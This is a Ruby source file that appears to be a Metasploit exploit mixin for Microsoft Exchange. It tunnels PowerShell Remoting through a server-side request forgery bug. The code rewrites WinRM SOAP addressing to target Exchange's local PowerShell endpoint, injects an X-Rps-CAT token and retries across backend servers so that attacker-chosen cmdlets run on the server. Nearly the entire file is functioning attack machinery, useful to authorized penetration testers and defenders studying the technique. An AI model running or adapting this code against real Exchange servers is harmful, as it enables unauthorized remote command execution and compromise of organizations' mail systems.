# -*- coding: binary -*-

require 'winrm'

module Msf::Exploit::Remote::HTTP::Exchange::ProxyMaybeShell
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super

    register_advanced_options(
      [
        Msf::OptFloat.new('MaxBackendRetries', [true, 'The maximum number of times to retry for targeting the backend', 10]),
      ], self.class
    )
  end

  def execute_powershell(cmdlet, args: [], cat: nil)
    winrm = SSRFWinRMConnection.new({
      endpoint: full_uri('PowerShell/'),
      transport: :ssrf,
      max_backend_retries: datastore['MaxBackendRetries'].to_i,
      ssrf_proc: proc do |method, uri, opts|
        uri = "#{uri}?X-Rps-CAT=#{cat}" if cat
        opts[:data].gsub!(
          %r{<#{WinRM::WSMV::SOAP::NS_ADDRESSING}:To>(.*?)</#{WinRM::WSMV::SOAP::NS_ADDRESSING}:To>},
          "<#{WinRM::WSMV::SOAP::NS_ADDRESSING}:To>http://127.0.0.1/PowerShell/</#{WinRM::WSMV::SOAP::NS_ADDRESSING}:To>"
        )
        opts[:data].gsub!(
          %r{<#{WinRM::WSMV::SOAP::NS_WSMAN_DMTF}:ResourceURI mustUnderstand="true">(.*?)</#{WinRM::WSMV::SOAP::NS_WSMAN_DMTF}:ResourceURI>},
          "<#{WinRM::WSMV::SOAP::NS_WSMAN_DMTF}:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</#{WinRM::WSMV::SOAP::NS_WSMAN_DMTF}:ResourceURI>"
        )
        res = send_http(method, uri, opts)
        raise WinRM::WinRMAuthorizationError.new('Server responded with 401 Unauthorized.') if res&.code == 401

        res
      end
    })

    successful = true
    begin
      winrm.shell(:powershell) do |shell|
        shell.instance_variable_set(:@max_fragment_blob_size, WinRM::PSRP::MessageFragmenter::DEFAULT_BLOB_LENGTH)
        shell.extend(SSRFWinRMConnection::PowerShell)
        shell.run({ cmdlet: cmdlet, args: args }) do |stdout, stderr|
          unless stdout.blank?
            vprint_line('PSRP output received:')
            vprint_line(stdout)
          end
          unless stderr.blank?
            successful = false
            vprint_error('PSRP error received:')
            vprint_line(stderr)
          end
        end
      end
    rescue WinRM::WinRMAuthorizationError => e
      fail_with(Msf::Exploit::Failure::NoAccess, e.message)
    rescue WinRM::WinRMError => e
      vprint_error("Exception: #{e.message}")
      successful = false
    rescue Msf::Exploit::Failed => e
      raise e
    rescue RuntimeError => e
      print_error("Exception: #{e.inspect}")
      successful = false
    end

    successful
  end

  def send_http(method, uri, opts = {})
    request = {
      'method' => method,
      'uri' => uri,
      'agent' => datastore['UserAgent'],
      'ctype' => opts[:ctype],
      'cookie' => opts[:cookie],
      'headers' => { 'Accept' => '*/*', 'Cache-Control' => 'no-cache', 'Connection' => 'keep-alive' }
    }
    request = request.merge({ 'data' => opts[:data] }) unless opts[:data].nil?
    request = request.merge({ 'headers' => opts[:headers] }) unless opts[:headers].nil?
    request = request.merge(opts[:authentication]) unless opts[:authentication].nil?

    begin
      received = send_request_cgi(request)
    rescue Errno::ECONNRESET => e
      fail_with(Msf::Exploit::Failure::Disconnected, 'Server reset the connection.')
    end

    fail_with(Msf::Exploit::Failure::TimeoutExpired, 'Server did not respond in an expected way.') unless received

    received
  end

  class XMLTemplate
    def self.render(template_name, context = nil)
      file_path = ::File.join(::Msf::Config.data_directory, 'exploits', 'proxymaybeshell', "#{template_name}.xml.erb")
      template = ::File.binread(file_path)
      case context
      when Hash
        b = binding
        locals = context.collect { |k, _| "#{k} = context[#{k.inspect}]; " }
        b.eval(locals.join)
      when NilClass
        b = binding
      else
        raise ArgumentError
      end
      b.eval(Erubi::Engine.new(template).src)
    end
  end

  class SSRFWinRMConnection < WinRM::Connection
    class MessageFactory < WinRM::PSRP::MessageFactory
      def self.create_pipeline_message(runspace_pool_id, pipeline_id, command)
        WinRM::PSRP::Message.new(
          runspace_pool_id,
          WinRM::PSRP::Message::MESSAGE_TYPES[:create_pipeline],
          XMLTemplate.render('create_pipeline', cmdlet: command[:cmdlet], args: command[:args]),
          pipeline_id
        )
      end
    end

    # we have to define this class so we can define our own transport factory that provides one backed by the SSRF
    # vulnerability
    class TransportFactory < WinRM::HTTP::TransportFactory
      class HttpSsrf < WinRM::HTTP::HttpTransport
        # rubocop:disable Lint/
        def initialize(endpoint, options)
          @endpoint = endpoint.is_a?(String) ? URI.parse(endpoint) : endpoint
          @ssrf_proc = options[:ssrf_proc]
          # this tracks the backend target, the PSRP session needs to communicate with one target
          # this would be the case if Exchange Data Access Group (DAG) is in use
          @backend = nil
          @max_backend_attempts = [options.fetch(:max_backend_retries, 10) + 1, 1].max
        end

        def send_request(message)
          resp = nil
          @max_backend_attempts.times do
            resp = @ssrf_proc.call('POST', @endpoint.path, { ctype: 'application/soap+xml;charset=UTF-8', data: message })

            if resp.code == 500 && resp.headers['X-CalculatedBETarget'] != @backend
              # retry the request if it failed and the backend was different than the target
              next
            end

            break
          end

          if resp&.code == 200 && @backend.nil?
            @backend = resp.headers['X-CalculatedBETarget']
          end

          WinRM::ResponseHandler.new(resp.body, resp.code).parse_to_xml
        end

        attr_reader :backend
      end

      def create_transport(connection_opts)
        raise NotImplementedError unless connection_opts[:transport] == :ssrf

        super
      end

      private

      def init_ssrf_transport(opts)
        HttpSsrf.new(opts[:endpoint], opts)
      end
    end

    module PowerShell
      def send_command(command, _arguments)
        command_id = SecureRandom.uuid.to_s.upcase
        message = MessageFactory.create_pipeline_message(@runspace_id, command_id, command)
        fragmenter.fragment(message) do |fragment|
          command_args = [connection_opts, shell_id, command_id, fragment]
          if fragment.start_fragment
            resp_doc = transport.send_request(WinRM::WSMV::CreatePipeline.new(*command_args).build)
            command_id = REXML::XPath.first(resp_doc, "//*[local-name() = 'CommandId']").text
          else
            transport.send_request(WinRM::WSMV::SendData.new(*command_args).build)
          end
        end

        command_id
      end
    end

    def initialize(connection_opts)
      # these have to be set to truthy values to pass the option validation, but they're not actually used because hax
      connection_opts.merge!({ user: :ssrf, password: :ssrf })
      super(connection_opts)
    end

    def transport
      @transport ||= begin
        transport_factory = TransportFactory.new
        transport_factory.create_transport(@connection_opts)
      end
    end
  end
end
